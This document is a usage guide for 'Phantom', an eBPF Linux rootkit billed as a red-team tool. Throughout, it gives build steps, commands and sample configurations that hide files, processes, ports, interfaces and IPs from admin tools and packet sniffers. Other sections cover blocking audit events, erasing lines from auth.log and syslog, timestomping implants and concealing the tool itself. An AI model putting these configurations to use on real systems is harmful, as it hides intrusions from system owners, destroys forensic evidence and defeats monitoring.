# Phantom how-to guide

Usage guide with sample configurations for authorized red team operations.

---

## Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [Building Phantom](#2-building-phantom)
3. [CLI reference](#3-cli-reference)
4. [Configuration file (JSON)](#4-configuration-file-json)
5. [Feature guides](#5-feature-guides)
6. [Sample configurations](#6-sample-configurations)
7. [Live reload (SIGHUP)](#7-live-reload-sighup)
8. [Event monitoring](#8-event-monitoring)
9. [Troubleshooting](#9-troubleshooting)
10. [Known limitations](#10-known-limitations)

---

## 1. Prerequisites

### Kernel requirements

- Linux kernel 5.4+ (5.15+ recommended, tested on 6.17.0)
- `CONFIG_DEBUG_INFO_BTF=y` (kernel BTF support)
- `CONFIG_BPF_SYSCALL=y`
- `CONFIG_BPF_KPROBE_OVERRIDE=y` (optional, for clean `ss` output)

Check your kernel:

```bash
uname -r                                    # Kernel version
cat /boot/config-$(uname -r) | grep BTF     # BTF support
cat /boot/config-$(uname -r) | grep BPF     # BPF support
```

### Build dependencies

```bash
# Debian/Ubuntu
sudo apt install clang llvm libelf-dev zlib1g-dev make \
    linux-tools-common linux-tools-$(uname -r)

# Verify
clang --version
llvm-strip --version
bpftool version
```

### Runtime requirements

- Root or `CAP_BPF` + `CAP_NET_ADMIN` capabilities
- `/sys/kernel/btf/vmlinux` must exist
- `RLIMIT_MEMLOCK` set to unlimited (Phantom does this automatically)

---

## 2. Building Phantom

### One-command build

```bash
cd phantom
./build.sh
```

This generates `vmlinux.h` from your kernel's BTF, compiles the BPF program, generates the skeleton, and links the final binary at `build/bin/phantom`.

### Manual build

```bash
# Step 1: Build libbpf (one-time)
cd ../libbpf-build/src
make
cd ../../phantom

# Step 2: Generate vmlinux.h
bpftool btf dump file /sys/kernel/btf/vmlinux format c > include/vmlinux.h

# Step 3: Build Phantom
make clean && make
```

### Custom config path

The default config file path is `/opt/pinfra.json`. Override at build time:

```bash
make CONFIG_PATH=/var/lib/.config.json
```

### Install system-wide

```bash
sudo make install    # Installs to /usr/local/bin/phantom
sudo make uninstall  # Removes it
```

---

## 3. CLI reference

Phantom uses a subcommand-based CLI with LIDS-style syntax.

### Commands

| Command | Description |
|---------|-------------|
| `daemon` | Run in daemon mode (loads BPF, hides targets, monitors events) |
| `status` | Load BPF, print current configuration, exit |
| `add <target>` | Add a hiding rule or enable a feature (persists to config) |
| `del <target>` | Remove a hiding rule |
| `list [category]` | List current rules (alias for `status`) |
| `flush` | Clear all rules and reset config |

### Options

| Option | Description |
|--------|-------------|
| `-v, --verbose` | Enable debug-level logging |
| `--debug` | Print hide events in daemon mode |
| `-h, --help` | Show help text |

### Feature toggles

```bash
# Enable features
phantom add enable-files           # File hiding
phantom add enable-procs           # Process hiding
phantom add enable-ports           # Port hiding
phantom add enable-audit           # Audit blocking
phantom add enable-exec            # Exec capture (audit/syslog suppression)
phantom add enable-file-filter     # File content filtering
phantom add enable-timestomp       # Timestomp feature
phantom add enable-iface           # Interface hiding
phantom add enable-ip              # IP hiding

# Disable features
phantom add disable-ports          # Disable port hiding only
phantom add disable-all            # Disable everything
```

### Hiding rules

```bash
# Files
phantom add file hide /path/to/secret.elf          # Hide exact filename
phantom add file hide-prefix redteam_              # Hide by prefix

# Processes (by PID, name, or absolute exe path)
phantom add process hide 1234                      # Hide by PID
phantom add process hide c2agent                   # Hide by name (resolved at add time)
phantom add process hide /opt/simulation/engine    # Hide by absolute exe path
phantom add process hide-prefix /opt/simulation/   # Hide all exes under path (LPM trie)

# Ports
phantom add port hide 4444                         # Hide from ss/netstat

# Interfaces (hide from ip a, ifconfig)
phantom add iface hide docker0                     # Hide interface by name
phantom add iface hide eth1                        # Hide by interface name

# IPs (hide from tcpdump/Wireshark and ip a)
phantom add ip hide 172.17.0.1                     # Hide IP from sniffers
phantom add ip hide-prefix 172.17.0                # Hide IP range (CIDR LPM)

# Exec capture (records PIDs for audit/syslog suppression)
phantom add exec hide implant                      # Capture exec events for "implant"
```

### File content filtering

```bash
# Hide lines matching a search string (content shifting)
phantom add file-line-hide /etc/passwd:ctf:x:1001:1001

# Search and replace in file reads
phantom add file-replace /opt/ctf/config:DEBUG=true:DEBUG=false

# Exempt binaries that must still see unfiltered content (by comm name or exe path)
phantom add file-filter-exempt ctfd
phantom add file-filter-exempt /opt/ctfd/.venv/bin/python

# Remove rules
phantom del file-line-hide /etc/passwd:ctf:x:1001:1001
phantom del file-replace /opt/ctf/config:DEBUG=true:DEBUG=false
phantom del file-filter-exempt ctfd
```

### Timestomp

```bash
# Global timestomp (applies to all hidden files)
phantom add timestomp 20200101000000               # YYYYMMDDhhmmss

# Per-file timestomp
phantom add timestomp /opt/implant 20200101000000

# Remove timestomp rules
phantom del timestomp /opt/implant                 # Remove specific
phantom del timestomp all                          # Remove all
```

### Rule management

```bash
# List current rules
phantom list
phantom status

# Flush all rules
phantom flush
```

---

## 4. Configuration file (JSON)

Phantom reads configuration from `/opt/pinfra.json` (or the path baked at build time). The `phantom add` and `phantom del` commands write to this file automatically.

### JSON schema

```json
{
  "files": ["filename1", "filename2"],
  "prefixes": ["prefix1_", "prefix2_"],
  "process_names": ["process_name", "/opt/simulation/engine"],
  "process_path_prefixes": ["/opt/simulation/"],
  "pids": [1234, 5678],
  "ports": [4444, 8443],
  "exec_names": ["implant", "c2agent"],
  "ifaces": ["docker0", "eth1"],
  "ips": ["172.17.0.1", "10.0.0.0/8"],
  "ppid": 0,
  "file_filters": [
    {
      "path": "/etc/passwd",
      "search": "ctf:x:1001:1001",
      "replace": "",
      "mode": "hide"
    }
  ],
  "file_filter_exempts": ["ctfd", "gunicorn", "/opt/ctfd/.venv/bin/python"],
  "timestomp_global": "20200101000000",
  "timestomp_rules": [
    {"path": "/opt/implant", "timestamp": "20200101000000"}
  ],
  "enable_files": true,
  "enable_procs": true,
  "enable_ports": true,
  "enable_audit": false,
  "enable_exec": true,
  "enable_file_filter": true,
  "enable_timestomp": true,
  "enable_iface": true,
  "enable_ip": true
}
```

### Field reference

| Field | Type | Max | Description |
|-------|------|-----|-------------|
| `files` | string[] | 64 | Exact filenames to hide (e.g., `"backdoor.elf"`) |
| `prefixes` | string[] | 32 | Filename prefixes to hide (e.g., `"redteam_"`) |
| `process_names` | string[] | 128 | Process names or absolute exe paths resolved to PIDs at startup |
| `process_path_prefixes` | string[] | 32 | Exe path prefixes (LPM trie); matching execs auto-hidden |
| `pids` | number[] | 128 | Process IDs to hide from `/proc` |
| `ports` | number[] | 32 | Port numbers to hide from `/proc/net/tcp` |
| `exec_names` | string[] | 64 | Process names to capture at exec time |
| `ifaces` | string[] | 32 | Network interface names to hide (e.g., `"docker0"`) |
| `ips` | string[] | 64 | IP addresses/CIDRs to hide from `ip a` and packet sniffers |
| `ppid` | number | - | Parent PID filter for port hiding (0 = hide from all) |
| `file_filters` | object[] | 32 | File content filter rules |
| `file_filters[].path` | string | 128 | Full path to the file to filter |
| `file_filters[].search` | string | 64 | String to search for in file reads |
| `file_filters[].replace` | string | 64 | Replacement string (empty for line hide) |
| `file_filters[].mode` | string | - | `"hide"` (remove line) or `"replace"` (in-place) |
| `file_filter_exempts` | string[] | 32 | Processes exempt from file filtering (`comm` name, or exe path starting with `/`) |
| `timestomp_global` | string | - | Global timestamp `YYYYMMDDhhmmss` for all hidden files |
| `timestomp_rules` | object[] | 32 | Per-file timestomp rules |
| `timestomp_rules[].path` | string | - | File path |
| `timestomp_rules[].timestamp` | string | - | Timestamp `YYYYMMDDhhmmss` |
| `enable_files` | bool | - | Enable file hiding |
| `enable_procs` | bool | - | Enable process hiding |
| `enable_ports` | bool | - | Enable port hiding |
| `enable_audit` | bool | - | Enable audit blocking |
| `enable_exec` | bool | - | Enable exec capture |
| `enable_file_filter` | bool | - | Enable file content filtering |
| `enable_timestomp` | bool | - | Enable timestomp |
| `enable_iface` | bool | - | Enable interface hiding |
| `enable_ip` | bool | - | Enable IP hiding |

---

## 5. Feature guides

### 5.1 File hiding

Hides files and directories from `ls`, `find`, `stat`, and any tool that reads directory entries via `getdents64`.

**How it works:** Phantom intercepts the `getdents64` syscall. When a directory is read, it scans the returned buffer for matching filenames and removes them by adjusting `d_reclen` of the previous entry to absorb the hidden one.

**Two modes:**
- **Exact match:** Hides a specific filename (e.g., `payload.elf`)
- **Prefix match:** Hides any filename starting with a prefix (e.g., `redteam_`)

```bash
# Hide specific files
phantom add file hide /opt/c2/payload.elf
phantom add file hide /opt/c2/config.json

# Hide by prefix
phantom add file hide-prefix redteam_
phantom add file hide-prefix .c2_

# Enable and start
phantom add enable-files
sudo phantom daemon
```

**Verify:**
```bash
ls /opt/c2/                    # Hidden files won't appear
find / -name "payload.elf"     # Won't find it
stat /opt/c2/payload.elf       # Still works (direct access)
```

### 5.2 Process hiding

Hides processes from `ps`, `top`, `htop`, and `/proc` directory enumeration.

**How it works:** Hooks `getdents64` on `/proc` directory reads. When a hidden PID's directory entry appears, it is absorbed into the previous entry. Absolute exe paths and path prefixes are also stored in an LPM trie so newly exec'd matching binaries are hidden automatically.

**Modes:**
- **By PID:** Hide a specific process ID
- **By name:** Resolve process name to PID(s) at startup. Matches `/proc/<pid>/comm`, argv0 basename, any cmdline argument basename, and exe basename. So `phantom` matches `sudo ./phantom daemon`, and `run.sh` matches `bash run.sh`.
- **By exe path:** Absolute path matches `/proc/<pid>/exe` (e.g. `/opt/simulation/engine`)
- **By path prefix (LPM):** Hide every process whose exe starts with the prefix

```bash
# Hide by PID
phantom add process hide 12345

# Hide by name (resolves to all matching PIDs)
phantom add process hide c2agent
phantom add process hide phantom          # matches sudo ./phantom daemon
phantom add process hide run.sh           # matches bash run.sh

# Hide by absolute exe path
phantom add process hide /opt/simulation/engine
phantom add process hide /opt/simulation/emailclient

# Hide all processes under a path prefix (LPM trie)
phantom add process hide-prefix /opt/simulation/

# Enable and start
phantom add enable-procs
sudo phantom daemon
```

**Verify:**
```bash
ps aux | grep c2agent          # Not visible
top -bn1 | grep 12345          # Not visible
ls /proc/12345                 # Still accessible (direct path)
```

### 5.3 Port hiding

Hides listening ports from `ss`, `netstat`, and `/proc/net/tcp` + `/proc/net/tcp6` enumeration.

**How it works:** Tracks `openat()` calls to `/proc/net/tcp` and `/proc/net/tcp6`. When those files are read, filters out lines containing hidden port numbers. For `ss` (which uses sock_diag netlink), intercepts `recvmsg` to filter port data.

```bash
# Hide C2 ports
phantom add port hide 4444
phantom add port hide 8443
phantom add port hide 53

# Enable and start
phantom add enable-ports
sudo phantom daemon
```

**Verify:**
```bash
ss -tlnp | grep 4444           # Not visible
netstat -tlnp | grep 8443      # Not visible
cat /proc/net/tcp               # Hidden ports filtered out
```

### 5.4 Exec capture

Captures process execution events and records PIDs for audit/syslog suppression. When a monitored process executes, its PID is tracked so audit records and syslog entries mentioning it can be filtered.

```bash
# Capture executions of "implant"
phantom add exec hide implant

# Enable and start
phantom add enable-exec
sudo phantom daemon
```

### 5.5 File content filtering

Filters file content at the `read()` level. Two modes:

**Line hide mode:** Removes entire lines containing the search string. The output is shifted so no blank gap remains. Filtering applies to the trailing ~1KB of each `read()` (verifier-safe bound; enough for recent log tails / short files).

```bash
# Hide a user from /etc/passwd
phantom add file-line-hide /etc/passwd:ctf:x:1001:1001

# Hide a log entry
phantom add file-line-hide /var/log/auth.log:Failed password for root
```

**Replace mode:** Replaces occurrences of a search string with a replacement string in-place.

```bash
# Replace DEBUG=true with DEBUG=false
phantom add file-replace /opt/ctf/config:DEBUG=true:DEBUG=false

# Redact a hostname
phantom add file-replace /etc/hosts:c2server.local:REDACTED
```

**Exemptions:** Skip filtering for specific processes so services that need the real content keep working (e.g. hide a CTFd user line from observers but let CTFd resolve the account).

```bash
# By process name (comm, max 15 chars)
phantom add file-filter-exempt ctfd
phantom add file-filter-exempt gunicorn

# By absolute exe path (resolved to running PIDs at apply/reload time)
phantom add file-filter-exempt /opt/ctfd/.venv/bin/python

phantom del file-filter-exempt ctfd
```

Example: hide `ctfd` from `/etc/passwd` without breaking the CTFd service:

```bash
phantom add enable-file-filter
phantom add file-line-hide /etc/passwd:ctf:x:1001:1001
phantom add file-filter-exempt ctfd
```

Name lookups from non-exempt tools (`getent`, `id`, `grep`) still see the line as hidden. Path exemptions only cover PIDs running at apply/reload time until the next reload.

**Verify:**
```bash
grep "ctf" /etc/passwd          # Line is gone
cat /opt/ctf/config              # Shows DEBUG=false
```

### 5.6 Timestomp

Modifies file access and modification timestamps. Two modes:

**Global:** Applies a single timestamp to all hidden files.

```bash
phantom add timestomp 20200101000000
```

**Per-file:** Applies a specific timestamp to individual files.

```bash
phantom add timestomp /opt/implant 20200101000000
phantom add timestomp /opt/tools/exploit.py 20190615120000
```

**Timestamp format:** `YYYYMMDDhhmmss` (14 digits)

| Position | Meaning | Range |
|----------|---------|-------|
| YYYY | Year | 1970-2099 |
| MM | Month | 01-12 |
| DD | Day | 01-31 |
| hh | Hour | 00-23 |
| mm | Minute | 00-59 |
| ss | Second | 00-59 |

### 5.7 Interface hiding

Hides network interfaces from `ip a`, `ifconfig`, and any tool that reads via netlink route or `/proc/net/dev`.

**How it works:** Three interception paths:
- **NETLINK_ROUTE:** Intercepts `recvmsg` on NETLINK_ROUTE sockets and drops `RTM_NEWLINK` / `RTM_NEWADDR` messages for hidden interfaces.
- **/proc/net/dev:** Tracks reads on `/proc/net/dev` and compacts the buffer to remove lines for hidden interfaces.
- **ioctl SIOCGIFCONF:** Intercepts `ioctl(SIOCGIFCONF)` calls (used by `ifconfig` and some C libraries) and drops hidden interface entries from the result buffer.

```bash
# Hide interfaces
phantom add iface hide docker0
phantom add iface hide br-abcdef

# Enable and start
phantom add enable-iface
sudo phantom daemon
```

**Verify:**
```bash
ip a | grep docker0              # Not visible
ifconfig docker0                 # Not visible
```

### 5.8 IP hiding

Hides IP addresses from `ip a` and from packet sniffers like `tcpdump` and `Wireshark`.

**How it works:** Two interception paths:
- **NETLINK_ROUTE:** Drops `RTM_NEWADDR` messages for hidden IPs, so `ip a` doesn't show them.
- **AF_PACKET:** Intercepts `recvmsg` on AF_PACKET sockets (used by tcpdump/Wireshark) and zeroes out packet headers containing hidden source or destination IPs.

```bash
# Hide specific IPs
phantom add ip hide 172.17.0.1

# Hide IP range (CIDR prefix match via LPM trie)
phantom add ip hide-prefix 172.17.0
phantom add ip hide-prefix 10.0.0

# Enable and start
phantom add enable-ip
sudo phantom daemon
```

**Verify:**
```bash
ip a | grep 172.17.0.1          # Not visible
sudo tcpdump -i eth0             # Packets with hidden IPs show zeroed headers
```

---

## 6. Sample configurations

### 6.1 Minimal file hiding

Hide red team staging files from directory listings.

```json
{
  "files": ["payload.elf", "tools.tar.gz"],
  "prefixes": ["rt_"],
  "enable_files": true
}
```

```bash
sudo install -m 600 config.json /opt/pinfra.json
sudo phantom daemon
```

### 6.2 C2 agent hiding

Hide a C2 agent process and its listening port.

```json
{
  "process_names": ["c2agent"],
  "ports": [4444, 8443],
  "enable_procs": true,
  "enable_ports": true
}
```

### 6.3 Full red team infrastructure

Complete infrastructure hiding for an adversary emulation engagement.

```json
{
  "files": [
    "/opt/rt/payload.elf",
    "/opt/rt/c2config.json",
    "/opt/rt/exfil.log"
  ],
  "prefixes": ["redteam_", ".c2_", "rt_"],
  "process_names": ["c2agent", "implant", "c2server"],
  "ports": [4444, 8443, 53, 8080],
  "exec_names": ["implant", "c2agent"],
  "ifaces": ["docker0", "br-abcdef"],
  "ips": ["172.17.0.1", "10.0.0.0/8"],
  "enable_files": true,
  "enable_procs": true,
  "enable_ports": true,
  "enable_audit": true,
  "enable_exec": true,
  "enable_iface": true,
  "enable_ip": true
}
```

### 6.4 CTF competition setup

Hide your CTF exploit infrastructure while competing.

```json
{
  "files": ["exploit.py", "shellcode.bin"],
  "prefixes": ["ctf_"],
  "process_names": ["ncat", "socat"],
  "ports": [9999, 1234],
  "file_filters": [
    {
      "path": "/etc/passwd",
      "search": "ctf:x:1001:1001",
      "mode": "hide"
    },
    {
      "path": "/etc/passwd",
      "search": "hacker:x:1002:1002",
      "mode": "hide"
    }
  ],
  "file_filter_exempts": ["ctfd"],
  "enable_files": true,
  "enable_procs": true,
  "enable_ports": true,
  "enable_file_filter": true
}
```

### 6.5 File content manipulation

Hide evidence from configuration files and logs.

```json
{
  "enable_file_filter": true,
  "file_filters": [
    {
      "path": "/etc/passwd",
      "search": "redteam:x:",
      "mode": "hide"
    },
    {
      "path": "/var/log/syslog",
      "search": "c2agent",
      "mode": "hide"
    },
    {
      "path": "/opt/app/config.ini",
      "search": "debug=true",
      "replace": "debug=false",
      "mode": "replace"
    },
    {
      "path": "/etc/hosts",
      "search": "c2.evil.com",
      "replace": "127.0.0.1",
      "mode": "replace"
    }
  ]
}
```

### 6.6 Timestomp configuration

Make red team files appear to have old timestamps.

```json
{
  "files": ["/opt/rt/implant", "/opt/rt/config.json"],
  "prefixes": ["rt_"],
  "enable_files": true,
  "enable_timestomp": true,
  "timestomp_global": "20200101000000",
  "timestomp_rules": [
    {"path": "/opt/rt/implant", "timestamp": "20190615120000"},
    {"path": "/opt/rt/config.json", "timestamp": "20190301083000"}
  ]
}
```

### 6.7 Scoped hiding (PPID filter)

Only hide ports from processes spawned by your agent. Other processes on the system see all ports normally. Note: the `ppid` filter currently applies only to port hiding; file and process hiding are unconditional.

```json
{
  "files": ["payload.elf"],
  "process_names": ["c2agent"],
  "ports": [4444],
  "ppid": 1234,
  "enable_files": true,
  "enable_procs": true,
  "enable_ports": true
}
```

The `ppid` value should be the PID of your parent process (e.g., the C2 agent that spawns tools). Set to `0` to hide from all processes (default behavior).

### 6.8 Stealth deployment

Hide Phantom's own config file and use a non-standard path.

```bash
# Build with custom config path
make CONFIG_PATH=/var/lib/.cache.json

# Deploy
sudo install -m 600 config.json /var/lib/.cache.json
```

```json
{
  "files": ["/var/lib/.cache.json"],
  "prefixes": ["redteam_"],
  "process_names": ["c2agent"],
  "ports": [4444],
  "enable_files": true,
  "enable_procs": true,
  "enable_ports": true,
  "enable_exec": true,
  "exec_names": ["c2agent"]
}
```

---

## 7. Live reload (SIGHUP)

Phantom supports live configuration reload without restarting. When the daemon receives `SIGHUP`, it:

1. Re-reads `/opt/pinfra.json`
2. Clears all BPF map entries
3. Re-applies the new configuration
4. Continues running

### Adding rules while running

The `phantom add` and `phantom del` commands automatically:
1. Load the existing config
2. Apply the change
3. Save to `/opt/pinfra.json`
4. Send `SIGHUP` to the running daemon (if PID file exists)

```bash
# Terminal 1: Start daemon
sudo phantom daemon

# Terminal 2: Add rules while running
phantom add port hide 9999
phantom add process hide 4567
phantom add file hide /tmp/loot.tar.gz

# Changes take effect immediately in the running daemon
```

### Manual reload

```bash
# Send SIGHUP to force config reload
sudo kill -HUP $(cat /tmp/phantom.pid)
```

### Reload flow

```
phantom add port hide 9999
    ├── Load /opt/pinfra.json
    ├── Add port 9999 to config
    ├── Save updated config to /opt/pinfra.json
    └── Send SIGHUP to daemon PID (from /tmp/phantom.pid)
         └── Daemon re-reads config, clears maps, re-applies
```

---

## 8. Event monitoring

In daemon mode, Phantom monitors events from BPF programs via a ring buffer.

### Enable event printing

```bash
sudo phantom --debug daemon
```

### Event types

| Event | Description |
|-------|-------------|
| `FILE_HIDDEN` | A file was hidden from a directory listing |
| `PROC_HIDDEN` | A process was hidden from `/proc` enumeration |
| `PORT_HIDDEN` | A port was hidden from `/proc/net/tcp` read |
| `AUDIT_BLOCKED` | An audit event was blocked |
| `TIMESTOMP` | A file timestamp was modified |
| `EXEC_CAPTURED` | A process execution was captured |
| `FILE_LINE_HIDDEN` | A line was hidden from a file read |
| `FILE_REPLACED` | A string was replaced in a file read |
| `IFACE_HIDDEN` | A network interface was hidden |
| `IP_HIDDEN` | An IP address was hidden from a sniffer |
| `ERROR` | An error occurred during hiding |

### Event output format

```
[FILE_HIDDEN] pid=1234 comm=ls file=secret.key success=yes
[PROC_HIDDEN] pid=1234 comm=ps file=5678 success=yes
[PORT_HIDDEN] pid=1234 comm=ss port=4444 success=yes
[EXEC_CAPTURED] pid=1234 comm=bash file=implant success=yes
```

### Daemon PID file

Phantom writes its PID to `/tmp/phantom.pid` in daemon mode. This is used by `phantom add/del` to send `SIGHUP` for live reload.

```bash
# Check if daemon is running
cat /tmp/phantom.pid
kill -0 $(cat /tmp/phantom.pid) 2>/dev/null && echo "Running" || echo "Stopped"
```

---

## 9. Troubleshooting

### BPF loading fails

```
Failed to load BPF skeleton: Cannot allocate memory
```

**Fix:** Set memlock limit:
```bash
ulimit -l unlimited
# Or permanently in /etc/security/limits.conf:
# *  soft  memlock  unlimited
# *  hard  memlock  unlimited
```

### Verifier rejects program

```
Failed to load BPF skeleton: Argument list too long
```

**Cause:** BPF verifier complexity limit exceeded. This can happen with too many hiding rules or complex programs.

**Fix:** Reduce the number of concurrent hiding rules, or enable only the features you need.

### recvmsg kretprobe fails

```
Could not attach recvmsg kretprobe (perf_event_paranoid too high?)
Port hiding will work but ss output may have trailing garbage
```

**Fix:** Lower `perf_event_paranoid`:
```bash
echo 1 | sudo tee /proc/sys/kernel/perf_event_paranoid
```

Or check if `CONFIG_BPF_KPROBE_OVERRIDE=y` is enabled in your kernel.

### Missing BTF

```
ERROR: /sys/kernel/btf/vmlinux not found
```

**Fix:** Enable `CONFIG_DEBUG_INFO_BTF=y` in your kernel config and rebuild, or use a kernel that has it enabled (most distro kernels do).

### Process name not resolving

```
No running process matched name: c2agent
```

**Cause:** The process isn't running when Phantom starts. Process names are resolved to PIDs at startup by scanning `/proc`.

**Fix:** Start the process first, then start Phantom. Or use PID directly:
```bash
phantom add process hide 12345
```

### Config not found

Phantom silently ignores a missing config file. If no config exists and no CLI rules are set, nothing will be hidden. Create the config:

```bash
echo '{"enable_files": true}' | sudo tee /opt/pinfra.json
```

---

## 10. Known limitations

1. **Direct access works:** Hidden files are only hidden from directory listings. `cat /path/to/file` and `stat /path/to/file` still work.

2. **First dentry can't be hidden:** The `getdents64` technique requires a previous directory entry to merge into. If a hidden file is the first entry in a buffer, it may still be visible.

3. **BPF programs visible via bpftool:** Loaded BPF programs can be listed with `sudo bpftool prog list`. Consider hiding bpftool itself.

4. **Requires root/CAP_BPF:** BPF program loading requires elevated privileges.

5. **Some hardened kernels block `bpf_probe_write_user`:** Timestomp and some other features may not work on kernels with `bpf_probe_write_user` disabled.

6. **`ss` output may have trailing garbage:** If the recvmsg kretprobe can't attach (high `perf_event_paranoid`), `ss` output after filtered ports may contain garbage bytes.

7. **Port hiding covers `/proc/net/tcp` and `ss`:** Direct socket inspection via `sock_diag` is filtered, but raw `netlink` socket queries may still reveal ports.

8. **Process hiding via `/proc`:** Tools that read `/proc/<pid>/comm` directly (not via directory listing) can still detect hidden processes.

---

## Quick reference card

```bash
# Build
./build.sh

# One-shot: hide files and run
sudo phantom add file hide-prefix redteam_
sudo phantom add enable-files
sudo phantom daemon

# Full infrastructure
sudo phantom add file hide /opt/c2/payload.elf
sudo phantom add file hide-prefix rt_
sudo phantom add process hide c2agent
sudo phantom add port hide 4444
sudo phantom add port hide 8443
sudo phantom add iface hide docker0
sudo phantom add ip hide 172.17.0.1
sudo phantom add exec hide implant
sudo phantom add enable-files
sudo phantom add enable-procs
sudo phantom add enable-ports
sudo phantom add enable-iface
sudo phantom add enable-ip
sudo phantom add enable-exec
sudo phantom daemon --debug

# Check status
sudo phantom status

# Add rules to running daemon
phantom add port hide 9999
phantom add process hide 4567

# Clear everything
phantom flush
```

---

## License

MIT License

Copyright (c) 2026

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
